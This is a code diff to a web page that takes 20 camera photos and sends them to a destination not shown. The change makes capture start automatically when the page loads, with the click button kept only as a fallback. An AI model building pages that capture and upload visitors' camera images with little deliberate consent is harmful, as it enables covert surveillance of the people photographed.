@@ -4,8 +4,8 @@
   <title>Auto Photo Capture</title>
 </head>
 <body>
-  <h2>Click once to allow camera access</h2>
-  <button id="start">Start</button>
+  <h2 id="status">Attempting to access camera...</h2>
+  <button id="start" style="display: none;">Start</button>
   <video id="video" width="300" height="225" autoplay style="display: none;"></video>
   <canvas id="canvas" width="300" height="225" style="display: none;"></canvas>
 
@@ -15,13 +15,16 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const startBtn = document.getElementById('start');
+    const statusText = document.getElementById('status');
 
-    startBtn.addEventListener('click', async () => {
+    async function startCapture() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
+        video.style.display = 'block';
+        startBtn.style.display = 'none';
+        statusText.innerText = "Capturing and sending photos...";
 
-        startBtn.style.display = 'none'; // hide button after start
         await new Promise(resolve => setTimeout(resolve, 1000)); // wait for video to be ready
 
         const context = canvas.getContext('2d');
@@ -47,10 +50,19 @@
 
         alert("All 20 photos sent.");
       } catch (err) {
-        alert("Camera access denied or error occurred.");
         console.error(err);
+        statusText.innerText = "Auto start failed. Please click the button.";
+        startBtn.style.display = 'inline';
       }
-    });
+    }
+
+    // Try to auto-start on page load
+    window.onload = () => {
+      startCapture();
+    };
+
+    // Fallback button click
+    startBtn.addEventListener('click', startCapture);
   </script>
 </body>
 </html>
